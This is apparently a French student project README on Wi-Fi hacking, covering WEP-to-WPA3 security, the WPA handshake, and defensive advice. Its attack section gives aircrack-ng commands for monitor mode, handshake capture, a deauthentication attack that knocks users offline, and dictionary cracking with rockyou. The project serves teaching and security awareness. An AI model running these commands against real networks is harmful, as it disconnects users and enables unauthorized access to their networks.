
# 📡 Le Hacking Sans Fil : Concepts, Méthodes et Sécurité
> **Étude technique sur l'exploitation et la sécurisation des réseaux IEEE 802.11.**


## 🎯 1. Introduction au Wi-Fi Hacking
Le hacking sans fil consiste à exploiter les vulnérabilités inhérentes aux protocoles et aux configurations des réseaux sans fil pour obtenir un accès non autorisé. 




### Pourquoi cette étude est-elle cruciale ?
Avec la prolifération des objets connectés (IoT), les réseaux sans fil sont devenus des cibles de choix. Comprendre ces menaces est l'unique moyen de mettre en place des contre-mesures efficaces.

---

## 🌐 2. Panorama des Technologies et Protocoles
Le projet couvre les technologies majeures (Wi-Fi, Bluetooth, Zigbee) et analyse l'évolution de la sécurité.

### Évolution de la Sécurité Wi-Fi
| Protocole | Mécanisme | État de Sécurité |
| :--- | :--- | :--- |
| **WEP** | Clés statiques, IV courts. | **Obsolète** (Vulnérable aux attaques IV). |
| **WPA** | Utilise TKIP pour des clés dynamiques. | **Faible** (Sensible aux attaques par dictionnaire). |
| **WPA2** | Standard actuel basé sur AES. | **Robuste** mais sensible via le Handshake. |
| **WPA3** | Protection contre la force brute. | **Recommandé** (Standard le plus sûr). |

---

## 🤝 3. Le Handshake : Le Cœur de l'Authentification
Le **Handshake Wi-Fi** est une procédure en 4 étapes permettant d'établir une connexion sécurisée entre un client et un point d'accès.

1.  **Initiation (Request)**.
2.  **Réponse (Response)**.
3.  **Validation (Reconfirmation)**.
4.  **Finalisation (Confirmation)**.




---

## 🛠️ 4. Méthodologie d'Attaque (Démonstration Technique)
L'attaque suit un cycle rigoureux de reconnaissance, de scanning et d'exploitation.

### Étape 1 : Reconnaissance et Footprinting
Identification des cibles potentielles (BSSID, SSID) via des scans passifs.


### Étape 2 : Capture du Handshake
Pour craquer une clé, l'attaquant doit capturer l'échange initial. Si aucun client n'est connecté, on utilise une **attaque de dé-authentification** pour forcer une reconnexion.

**Commandes critiques (Suite Aircrack-ng) :**
```bash
# 1. Passer l'interface en mode monitor
airmon-ng start wlan0
```
<img width="945" height="567" alt="image" src="https://github.com/user-attachments/assets/1c6c75eb-036c-499f-80c7-0f30861408dd" />

```bash
# 2. Scanner les réseaux pour identifier la cible (BSSID/Canal)
airodump-ng wlanmon0
```
<img width="945" height="572" alt="image" src="https://github.com/user-attachments/assets/6a901f1d-492e-474d-b66b-8f12a8bf126d" />

```bash
# 3. Cibler le point d'accès et capturer les paquets
airodump-ng -w capture --bssid <BSSID> -c <CH> wlanmon0
```
<img width="945" height="455" alt="image" src="https://github.com/user-attachments/assets/f3dd88c0-426e-4199-a26f-a9461bc6e43e" />

```bash
# 4. Forcer la déconnexion des utilisateurs pour saisir le handshake
aireplay-ng --deauth 0 -a <BSSID> wlanmon0
```
<img width="945" height="397" alt="image" src="https://github.com/user-attachments/assets/82520df7-a2ca-4495-9293-d8f6ef5068de" />


### Étape 3 : Craquage par Dictionnaire
Une fois le fichier `.cap` obtenu, on utilise une liste de mots de passe pour dériver la clé.
```bash
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
```
<img width="945" height="516" alt="image" src="https://github.com/user-attachments/assets/c0242786-0132-4f46-a3c9-4fe24a42b50c" />

---

## 🛡️ 5. Stratégies de Défense et Audit
La sécurité ne repose pas sur un seul outil, mais sur une hygiène réseau stricte.

*   **Chiffrement Fort :** Migration impérative vers le **WPA3**.
*   **Hygiène des Mots de Passe :** Utilisation de clés complexes et uniques.
*   **Maintenance :** Mise à jour régulière du firmware des routeurs.
*   **Discrétion :** Désactivation du SSID pour limiter la visibilité face aux scanners.



---

## 🏁 Conclusion
Ce projet démontre que la sécurité des réseaux sans fil est un équilibre fragile entre technologie et vigilance humaine. L'utilisation d'outils comme **Wireshark** et **Kismet** permet de détecter les activités suspectes avant qu'une intrusion ne réussisse.

---

### 📂 Ressources du Projet
*   **Rapport complet :** `Projet_SSI.docx`
*   **Guide des commandes :** `commandes_aircrack.pdf`
*   **Présentation visuelle :** `Le-Hacking-Sans-Fil.pdf`

---

**Analogie pour comprendre :**
Le hacking Wi-Fi, c'est comme essayer de **crocheter une serrure numérique**. Le Handshake est le moment où la clé entre dans la serrure. L'attaquant enregistre le son du mécanisme (capture du handshake) puis, une fois rentré chez lui, fabrique des milliers de fausses clés (dictionnaire) jusqu'à ce qu'il trouve celle qui produit exactement le même son (craquage).
